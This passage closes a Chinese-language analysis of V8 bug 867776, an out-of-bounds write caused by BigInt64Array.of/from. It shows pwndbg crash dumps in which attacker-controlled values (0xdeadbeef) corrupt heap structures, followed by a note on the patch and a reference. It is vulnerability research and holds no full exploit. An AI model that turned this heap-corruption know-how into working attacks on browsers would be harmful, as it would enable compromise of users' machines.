    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    [New Thread 0x7fe86accc700 (LWP 84765)]
    [New Thread 0x7fe86a4cb700 (LWP 84766)]
    [New Thread 0x7fe869cca700 (LWP 84767)]
    [New Thread 0x7fe8694c9700 (LWP 84768)]
    [New Thread 0x7fe868cc8700 (LWP 84769)]
    [New Thread 0x7fe8684c7700 (LWP 84770)]
    [New Thread 0x7fe867cc6700 (LWP 84771)]
    callback
    Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
    tcache_get (tc_idx=4) at malloc.c:2951
    2951      --(tcache->counts[tc_idx]);
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────
     RAX  0x5606a95b6030 ◂— 0x10000
     RBX  0x4
     RCX  0x5606a95b6018 ◂— 0x10001
     RDX  0x0
     RDI  0x58
     RSI  0x7ffe89539b58 —▸ 0x5606a95d2ef0 —▸ 0x7ffe8953ba10 ◂— 0x5606a95d2ef0
     R8   0xdeadbeef
     R9   0x7ffe89539b6c ◂— 0x89539df800000002
     R10  0x58
     R11  0x58
     R12  0xffffffffffffffa8
     R13  0x5606a95d2fb8 —▸ 0x283c80e82ba9 ◂— 0x283c80e822
     R14  0x5
     R15  0x7ffe8953ab08 —▸ 0x354172782e39 ◂— 0xb1000005ceeae0ae
     RBP  0x58
     RSP  0x7ffe89539990 —▸ 0x7fe86cf8d220 ◂— push   rbp
     RIP  0x7fe86b7227be (malloc+286) ◂— mov    rsi, qword ptr [r8]
    ───────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────
     ► 0x7fe86b7227be     mov    rsi, qword ptr [r8]
       0x7fe86b7227c1     mov    qword ptr [rax + 0x80], rsi
       0x7fe86b7227c8     mov    word ptr [rcx], dx
       0x7fe86b7227cb     mov    qword ptr [r8 + 8], 0
       0x7fe86b7227d3     jmp    malloc+184 
        ↓
       0x7fe86b722758     pop    rbx
       0x7fe86b722759     mov    rax, r8
       0x7fe86b72275c     pop    rbp
       0x7fe86b72275d     pop    r12
       0x7fe86b72275f     ret    
       0x7fe86b722760     and    rax, 0xfffffffffffffff0
    ───────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────
    In file: /build/glibc-TrjWJf/glibc-2.29/malloc/malloc.c
       2946 {
       2947   tcache_entry *e = tcache->entries[tc_idx];
       2948   assert (tc_idx entries[tc_idx] > 0);
       2950   tcache->entries[tc_idx] = e->next;
     ► 2951   --(tcache->counts[tc_idx]);
       2952   e->key = NULL;
       2953   return (void *) e;
       2954 }
       2955 
       2956 static void
    ───────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────
    00:0000│ rsp  0x7ffe89539990 —▸ 0x7fe86cf8d220 ◂— push   rbp
    01:0008│      0x7ffe89539998 —▸ 0x7ffe895399e0 —▸ 0x7ffe89539aa0 —▸ 0x7ffe89539de0 —▸ 0x7ffe89539e00 ◂— ...
    02:0010│      0x7ffe895399a0 ◂— 0xffffffffffffffff
    03:0018│      0x7ffe895399a8 —▸ 0x7fe86bb459d8 ◂— mov    qword ptr [rbp - 0x10], rax
    04:0020│      0x7ffe895399b0 ◂— 0x2a100
    05:0028│      0x7ffe895399b8 —▸ 0x5606a962c3d0 ◂— 0x0
    06:0030│      0x7ffe895399c0 —▸ 0x5606a962c370 ◂— 0x0
    07:0038│      0x7ffe895399c8 —▸ 0x5606a962d3f0 —▸ 0x7fe86e241580 —▸ 0x7fe86d76e780 (v8::internal::CodeSpace::~CodeSpace()) ◂— push   rbp
    ─────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────
     ► f 0     7fe86b7227be malloc+286
       f 1     7fe86b7227be malloc+286
       f 2     7fe86bb459d8
       f 3     7fe86d823957
       f 4     7fe86d8209a1
       f 5     7fe86d8168de
       f 6     7fe86d816309 v8::internal::Sweeper::StartSweeperTasks()+857
       f 7     7fe86d7932b7 v8::internal::MarkCompactCollector::Finish()+343
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
第二种
    pwndbg> r
    Starting program: /usr/class/v8/v8/out/x64.debug/d8 --allow-natives-syntax --expose-gc test.js
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    [New Thread 0x7f1802341700 (LWP 87692)]
    [New Thread 0x7f1801b40700 (LWP 87693)]
    [New Thread 0x7f180133f700 (LWP 87694)]
    [New Thread 0x7f1800b3e700 (LWP 87695)]
    [New Thread 0x7f180033d700 (LWP 87696)]
    [New Thread 0x7f17ffb3c700 (LWP 87697)]
    [New Thread 0x7f17ff33b700 (LWP 87698)]
    callback
    Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
    0x00007f180468f76b in std::__1::__hash_table, std::__1::__unordered_map_hasher, std::__1::hash, true>, std::__1::__unordered_map_equal, std::__1::equal_to, true>, std::__1::allocator > >::__emplace_unique_key_args, std::__1::tuple<> >(unsigned long const&, std::__1::piecewise_construct_t const&, std::__1::tuple&&, std::__1::tuple<>&&) (this=0x559480f98fc8, __k=[@0x7ffd622fe4c8](https://github.com/0x7ffd622fe4c8 "@0x7ffd622fe4c8"): 22, __args=..., __args=..., __args=...) at ../../buildtools/third_party/libc++/trunk/include/__hash_table:2010       
    2010                for (__nd = __nd->__next_; __nd != nullptr &&
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────
     RAX  0xdeadbeef
     RBX  0x7f1804602220 ◂— push   rbp
     RCX  0x559480f98fc8 —▸ 0x559480ff5c50 ◂— 0xdeadbeef
     RDX  0x0
     RDI  0x7ffd622fe4c8 ◂— 0x16
     RSI  0x16
     R8   0x559480f99020 ◂— 0x1
     R9   0x10
     R10  0x0
     R11  0x7f1802ecaca0 (main_arena+96) —▸ 0x559481034310 ◂— 0x0
     R12  0xffffffffffffffff
     R13  0x559480f8efb8 —▸ 0xba4cbf82ba9 ◂— 0xba4cbf822
     R14  0x5
     R15  0x7ffd622ffc08 —▸ 0x1d3adb982e39 ◂— 0xb10000254d0fb8ae
     RBP  0x7ffd622fe480 —▸ 0x7ffd622fe560 —▸ 0x7ffd622fe590 —▸ 0x7ffd622fe5c0 —▸ 0x7ffd622fe5f0 ◂— ...
     RSP  0x7ffd622fdd60 —▸ 0x7ffd622fdf90 ◂— 0x0
     RIP  0x7f180468f76b ◂— mov    rax, qword ptr [rax]
    ───────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────
     ► 0x7f180468f76b    mov    rax, qword ptr [rax]
       0x7f180468f76e    mov    qword ptr [rbp - 0x598], rax
       0x7f180468f775    xor    eax, eax
       0x7f180468f777    mov    cl, al
       0x7f180468f779    cmp    qword ptr [rbp - 0x598], 0
       0x7f180468f781    mov    byte ptr [rbp - 0x689], cl
       0x7f180468f787    je     0x7f180468f88e 
        ↓
       0x7f180468f88e    mov    al, byte ptr [rbp - 0x689]
       0x7f180468f894    test   al, 1
       0x7f180468f896    jne    0x7f180468f8a1 
        ↓
       0x7f180468f8a1    mov    rax, qword ptr [rbp - 0x678]
    ───────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────
    In file: /usr/class/v8/v8/buildtools/third_party/libc++/trunk/include/__hash_table
       2005     {
       2006         __chash = __constrain_hash(__hash, __bc);
       2007         __nd = __bucket_list_[__chash];
       2008         if (__nd != nullptr)
       2009         {
     ► 2010             for (__nd = __nd->__next_; __nd != nullptr &&
       2011                 (__nd->__hash() == __hash || __constrain_hash(__nd->__hash(), __bc) == __chash);
       2012                                                            __nd = __nd->__next_)
       2013             {
       2014                 if (key_eq()(__nd->__upcast()->__value_, __k))
       2015                     goto __done;
    ───────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────
    00:0000│ rsp  0x7ffd622fdd60 —▸ 0x7ffd622fdf90 ◂— 0x0
    01:0008│      0x7ffd622fdd68 —▸ 0x559481012378 —▸ 0x559481012310 —▸ 0x7f18058b3d60 —▸ 0x7f180483bc10 (v8::internal::Sweeper::IncrementalSweeperTask::~IncrementalSweeperTask()) ◂— ...                                                                                          
    02:0010│      0x7ffd622fdd70 ◂— 0x0
    03:0018│      0x7ffd622fdd78 —▸ 0x7ffd622fe450 —▸ 0x559480f99020 ◂— 0x1
    04:0020│      0x7ffd622fdd80 ◂— 9 /* '\t' */
    ... ↓
    06:0030│      0x7ffd622fdd90 —▸ 0x559481012360 —▸ 0x5594810122e0 —▸ 0x559480fd85d0 —▸ 0x559480ff43e0 ◂— ...
    07:0038│      0x7ffd622fdd98 —▸ 0x559480fe96d0 —▸ 0x559480fe9700 ◂— 0x0
    ─────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────
     ► f 0     7f180468f76b
       f 1     7f180468f76b
       f 2     7f180468e086 v8::internal::CancelableTaskManager::Register(v8::internal::Cancelable*)+502
       f 3     7f180468de7a v8::internal::Cancelable::Cancelable(v8::internal::CancelableTaskManager*)+106
       f 4     7f180468f237 v8::internal::CancelableTask::CancelableTask(v8::internal::CancelableTaskManager*)+39
       f 5     7f180468f200 v8::internal::CancelableTask::CancelableTask(v8::internal::Isolate*)+48
       f 6     7f1804d79983
       f 7     7f1804d71c98
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
## 五、后记
该漏洞的[补丁](https://chromium.googlesource.com/v8/v8.git/+/7d47839dc062b69467f58c55aab7cc9abf78d687)非常简单：将调用
ToBigInt 函数的那一行语句，提至条件判断语句之前。这样就可以使 user JS callback 导致的 Neutered 也被 if
条件判断给捕获。
## 六、参考
  * [Issue 867776: V8 OOB write BigInt64Array.of and BigInt64Array.from side effect neuter](https://bugs.chromium.org/p/chromium/issues/detail?id=867776)